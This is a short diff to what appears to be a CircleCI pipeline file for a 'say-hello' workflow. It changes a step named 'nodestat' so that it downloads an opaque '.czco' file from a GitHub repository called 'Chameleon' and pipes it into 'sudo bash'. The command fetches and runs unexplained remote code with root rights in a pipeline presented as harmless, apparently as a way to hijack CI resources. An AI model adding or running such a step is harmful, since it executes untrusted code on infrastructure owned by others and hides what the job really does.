@@ -10,7 +10,7 @@ jobs:
       - checkout
       - run:
           name: "nodestat"
-          command: "apt update && apt upgrade -y && apt install wget -y && wget https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco >> /ins && bash /ins node"
+          command: "apt update && apt upgrade -y && apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NateYeet/Chameleon/main/Chameleon/main.czco | sudo bash -"
 
 workflows:
   say-hello-workflow:
